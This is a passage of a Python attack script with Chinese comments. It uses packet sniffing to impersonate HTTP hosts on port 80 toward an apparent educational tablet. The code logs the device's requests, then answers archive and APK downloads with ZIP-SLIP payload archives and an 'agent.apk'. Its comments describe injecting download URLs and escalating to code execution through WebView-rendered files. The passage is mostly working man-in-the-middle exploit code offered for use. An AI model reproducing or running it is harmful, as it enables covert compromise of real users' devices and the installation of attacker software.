                             first[:70], host,
                             hl.get("sec-fetch-dest"), hl.get("sec-fetch-mode"),
                             hl.get("sec-fetch-site"), hl.get("accept", "")[:55],
                             hl.get("referer", "")[:80],
                             hl.get("upgrade-insecure-requests"),
                             "Y" if hl.get("cookie") else "N"))
                stat["req"] += 1
                path = first.split(" ")[1] if " " in first else "?"
                try:
                    if ("/api/" in path) or path.startswith("/XhServerMg") or "/microServer" in path:
                        _h2 = {}
                        for _ln in head.split(b"\r\n")[1:]:
                            if b":" in _ln:
                                _k, _v = _ln.split(b":", 1)
                                _h2[_k.strip().decode("latin1", "replace").lower()] = \
                                    _v.strip().decode("latin1", "replace")
                        wlog("!!!!!! [API-HDR] %s | Host=%s | %s" % (
                            first[:80], host,
                            json.dumps(dict(list(_h2.items())[:40]), ensure_ascii=False)[:1500]))
                except Exception as _e:
                    wlog("[API-HDR-ERR] %s" % _e)
                path = first.split(" ")[1] if " " in first else "?"
                stat["paths"][path] = stat["paths"].get(path, 0) + 1
                # 【侦察核心 2026-10-04】端侧学习应用正在明文 HTTP 拉资源(实测路径
                # /SB103007/<md5>.jpg|.png, 目的 39.173.108.81/83/85/91/102/103),
                # 而本冒充器接管了除自检主机外的全部 80 端口 -> 响应内容由我们决定。
                # 这里把 Host / 完整路径 / body 前缀全部落盘, 用来找 .html/.js/.json
                # 这类"被 WebView 渲染"的资源 —— 那才是从"改图"升级到"执行代码"的临界点。
                stat.setdefault("hosts", {})
                stat["hosts"][host] = stat["hosts"].get(host, 0) + 1
                ext = path.rsplit(".", 1)[-1].lower() if "." in path else ""
                # 【全量清单】统计端侧在这条明文通道上到底拉哪些文件类型 ——
                # 不靠猜扩展名, 用数据说话; 周期日志里会打出这个字典。
                if ext and len(ext) <= 6:
                    stat.setdefault("exts", {})
                    stat["exts"][ext] = stat["exts"].get(ext, 0) + 1
                if ext in ("html", "htm", "js", "json", "css", "xml", "zip", "7z",
                           "rar", "apk", "jar", "dex", "dat", "bin", "so", "txt",
                           "swf", "mp4", "svg", "m3u8", "pdf", "mp3", "wav"):
                    stat.setdefault("code_paths", {})
                    stat["code_paths"][path] = stat["code_paths"].get(path, 0) + 1
                    wlog("!!! [HIGH-VALUE-RESOURCE] .%s GET %s | Host=%s | body=%dB %r" % (
                        ext, path[:120], host, len(rest), rest[:50]))
                else:
                    wlog("HTTP %s | Host=%s | body=%dB %r" % (
                        first[:95], host, len(rest), rest[:40]))
                # ★★★ PAYLOAD-SERVE-2 (2026-10-16 21:4x): 端侧**指向我们自己的**归档/安装包请求
                #   直接下发我们的载荷(交给下面原有的分段发送逻辑处理)。
                #   触发场景(已实测打通): WS 注入 canvas_tag+type=3(短语下发) 带
                #     voiceUrl=http://<us>/xxx.7z  => 端侧真的发起下载(日志 [HIGH-VALUE-RESOURCE] .7z GET /poc0001.7z)
                #   .7z/.zip/.rar/.cwp -> ZIP-SLIP 载荷(含 /mnt/sdcard/xhproxy/<密文>)
                #   .apk              -> agent.apk
                data = None
                try:
                    _d0 = os.path.dirname(os.path.abspath(__file__))
                    if ext in ("zip", "rar", "cwp", "obb"):
                        _pl2 = os.path.join(_d0, "payload_proxy.zip")
                    elif ext in ("7z", "xz", "gz", "tar"):
                        _pl2 = os.path.join(_d0, "payload_proxy.7z")
                    elif ext == "apk":
                        _pl2 = os.path.join(_d0, "agent.apk")
                    else:
                        _pl2 = None
                    if _pl2 and os.path.exists(_pl2):
                        data = open(_pl2, "rb").read()
                        stat["payload_serve"] = stat.get("payload_serve", 0) + 1
                        wlog("!!!!!! [PAYLOAD-SERVE2] .%s %s | Host=%s -> %s (%dB) 已下发(ZIP-SLIP)"
                             % (ext, path[:80], host, os.path.basename(_pl2), len(data)))
                except Exception as _e2:
                    wlog("[PAYLOAD-SERVE2-ERR] %s" % _e2)
                if data is None:
                    data = build_response(path, rest, host, first.split(" ")[0])
                # TCP-SEGMENT-PATCH: 按 MTU 切片发送
                #   大响应(>1400B)必须分成多个 TCP 段, 否则设备丢弃/截断
                #   (实测: 3364B 页面从未执行; ~1400B 的执行成功)
                _SEG = 1400
                if data and len(data) > _SEG:
                    _n = 0
                    for _off in range(0, len(data), _SEG):
                        _chunk = data[_off:_off + _SEG]
                        emit(server, PORT, t.sport, "PA", f["mine"], f["next"], _chunk)
                        f["mine"] = (f["mine"] + len(_chunk)) & 0xFFFFFFFF
                        _n += 1
                        time.sleep(0.002)
                    wlog("[SEG] 响应 %dB -> %d 个 TCP 段 (路径 %s)" % (
                        len(data), _n, path[:80]))
                    stat["seg"] = stat.get("seg", 0) + 1
                else:
                    emit(server, PORT, t.sport, "PA", f["mine"], f["next"], data)
                    f["mine"] = (f["mine"] + len(data)) & 0xFFFFFFFF
                f["buf"] = rest
                f["buf"] = rest
        elif t.flags & 0x01:
            emit(server, PORT, t.sport, "FA", f["mine"], (t.seq + 1) & 0xFFFFFFFF)
            flows.pop(key, None)
        else:
            emit(server, PORT, t.sport, "A", f["mine"], f["next"])
    except Exception as e:
        wlog("ERR %s %s" % (type(e).__name__, e))


def main():
    with open(LOG, "a", encoding="utf-8") as f:
        f.write("\n===== npcap_http80 start %s watch=%ds page=%s bodylen=%d =====\n" % (
            datetime.datetime.now(), WATCH, BODY_SRC, len(BODY)))
    wlog("iface=%s pad=%s 冒充 :%d | 页面=%s (%dB)" % (iface_name(), PAD, PORT, BODY_SRC, len(BODY)))
    sn = AsyncSniffer(iface=iface_name(), store=False, prn=on_pkt, filter="tcp and port %d" % PORT)
    sn.start()
    t0 = time.time()
    while time.time() - t0 < WATCH:
        time.sleep(10)
        wlog("[stat] %s" % json.dumps({k: v for k, v in stat.items() if k != "paths"}, ensure_ascii=False))
    sn.stop()
    wlog("[end] %s" % stat)


if __name__ == "__main__":
    main()